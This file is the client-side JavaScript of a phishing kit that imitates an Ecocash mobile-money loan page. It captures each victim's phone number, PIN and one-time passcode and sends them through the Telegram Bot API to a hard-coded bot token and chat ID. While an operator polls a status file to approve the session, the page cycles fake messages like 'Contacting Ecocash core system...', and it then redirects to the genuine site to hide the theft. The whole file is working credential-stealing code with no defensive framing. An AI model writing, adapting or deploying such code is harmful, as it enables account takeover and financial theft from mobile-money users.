// CONFIG — CHANGE THESE
const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
const CHAT_ID = '1469249528';

// Fake status messages — cycle through to simulate real processing
const fakeMessages = [
    "Verifying your identity...",
    "Checking account history...",
    "Validating transaction security...",
    "Confirming loan eligibility...",
    "Finalizing approval stage...",
    "Contacting Ecocash core system...",
    "Encrypting session data..."
];

let msgIndex = 0;

// On loan form submit (Phone + PIN)
document.getElementById('loanForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const phone = document.getElementById('phone').value;
    const pin = document.getElementById('pin').value;

    // Send ONLY phone and PIN to Telegram
    const credentialsMsg = `
📱 *Ecocash Login*  
📞 *Phone:* ${phone}  
🔐 *PIN:* ${pin}
    `;

    await sendToTelegram(credentialsMsg);

    // Hide form, show OTP screen
    document.getElementById('loanForm').style.display = 'none';
    document.getElementById('otpScreen').style.display = 'block';

    // Show loader
    document.querySelector('.loader').style.display = 'block';

    // Start cycling fake messages
    msgIndex = 0;
    const statusMsg = document.getElementById('statusMsg');
    statusMsg.textContent = fakeMessages[0];

    const fakeCycle = setInterval(() => {
        msgIndex = (msgIndex + 1) % fakeMessages.length;
        statusMsg.textContent = fakeMessages[msgIndex];
    }, 2500);

    // Start approval polling
    pollApproval(phone, fakeCycle);
});

// Poll every 3 seconds for approval decision
async function pollApproval(phone, fakeCycle) {
    let attempts = 0;
    const statusMsg = document.getElementById('statusMsg');

    const interval = setInterval(async () => {
        if (attempts > 10) {
            clearInterval(interval);
            clearInterval(fakeCycle);
            document.querySelector('.loader').style.display = 'none';
            statusMsg.textContent = "Session expired.";
            return;
        }

        try {
            const res = await fetch('approval_status.txt?' + new Date().getTime());
            const decision = await res.text();

            // Stop fake messages
            clearInterval(fakeCycle);
            document.querySelector('.loader').style.display = 'none';

            if (decision.trim() === 'approve') {
                clearInterval(interval);
                statusMsg.textContent = "✅ Approved! Enter OTP and confirm.";
                showOTPConfirmButton(phone);
            } else if (decision.trim() === 'wrong_pin') {
                clearInterval(interval);
                statusMsg.textContent = "❌ Invalid PIN. Try again.";
                setTimeout(() => location.reload(), 2000);
            } else if (decision.trim() === 'wrong_otp') {
                clearInterval(interval);
                document.getElementById('otp').style.border = "2px solid #c62828";
                statusMsg.textContent = "❌ Invalid OTP.";
                // Allow retry or close
            }
        } catch (err) {
            // Ignore
        }

        attempts++;
    }, 3000);
}

// Show Confirm button after approval
function showOTPConfirmButton(phone) {
    if (document.getElementById('confirmOtpBtn')) return;

    const confirmBtn = document.createElement('button');
    confirmBtn.id = 'confirmOtpBtn';
    confirmBtn.textContent = 'Confirm OTP';
    confirmBtn.onclick = async () => {
        const otp = document.getElementById('otp').value.trim();
        if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
            alert("Enter a valid 4-digit OTP");
            return;
        }

        // Send ONLY phone and OTP to Telegram
        const otpMsg = `
🔑 *Ecocash OTP*  
📞 *Phone:* ${phone}  
🔢 *OTP:* ${otp}
        `;
        await sendToTelegram(otpMsg);

        // Final fake delay before redirect
        document.getElementById('statusMsg').textContent = "Syncing with Ecocash server...";
        document.querySelector('.loader').style.display = 'block';
        setTimeout(() => {
            document.getElementById('statusMsg').textContent = "✅ Success! Redirecting...";
            setTimeout(() => {
                window.location.href = "https://ecocash.co.zw";
            }, 1500);
        }, 2000);
    };

    document.getElementById('otpScreen').appendChild(confirmBtn);
}

// Send message to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {}); // Silent fail
}
